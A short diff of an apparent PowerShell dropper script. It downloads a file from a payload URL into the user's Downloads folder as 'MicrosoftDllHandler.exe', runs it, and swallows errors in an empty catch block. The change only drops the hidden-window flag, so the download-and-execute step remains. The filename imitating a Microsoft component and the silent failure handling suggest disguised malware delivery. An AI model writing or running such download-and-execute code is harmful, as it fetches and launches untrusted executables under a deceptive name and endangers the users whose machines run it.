@@ -4,5 +4,5 @@ $payloadPath = "$env:USERPROFILE\Downloads\MicrosoftDllHandler.exe"
 
 try {
     Invoke-WebRequest -Uri $payloadUrl -OutFile $payloadPath -UseBasicParsing
-    Start-Process -FilePath $payloadPath -WindowStyle Hidden
+    Start-Process -FilePath $payloadPath
 } catch {}
